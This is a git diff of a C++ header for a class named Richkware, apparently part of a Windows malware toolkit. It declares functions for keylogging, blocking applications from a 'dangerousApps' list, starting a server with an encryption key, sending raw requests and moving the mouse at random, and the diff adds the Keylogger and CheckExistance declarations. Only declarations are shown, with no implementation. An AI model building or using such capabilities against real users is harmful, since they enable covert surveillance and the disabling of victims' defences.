@@ -18,11 +18,13 @@
 #include <winnt.h>
 #include <winreg.h>
 #include <winuser.h>
+
 #include <iostream>
 #include <fstream>
 #include <stdio.h>
 #include <stdlib.h>
 #include <conio.h>
+#include <sstream>
 #include <ctime>
 #include <string.h>
 #include <cstring>
@@ -32,12 +34,12 @@
 #include <map>
 
 class Richkware {
-private:
+public:
 	HANDLE hBlockAppsTh;
 	
 	void SaveValueReg(const char* path, const char* key, const char* value);
 	std::string LoadValueReg(const char* path, const char* key);
-	void SaveFileDir(const char* path);
+	//void SaveFileDir(const char* path);
 public:
 	std::map<std::string, std::string> session;
 	std::list<const char*> dangerousApps;
@@ -51,11 +53,15 @@ public:
 	void OpenApp(const char* app);
 	void BlockApps();
 	void UnBlockApps();
+	void Keylogger(const char* fileName);
+	bool CheckExistance();
+	//void FirstRun();
+
 	int StartServer(const char* port, const char* EncryptionKey = NULL);
 	const char* RawRequest(const char * serverAddress, const char* port, const char* request);
+	
 	void Hibernation();
 	void RandMouse();
-	void Keylogger(const char* fileName);
 
 };
 
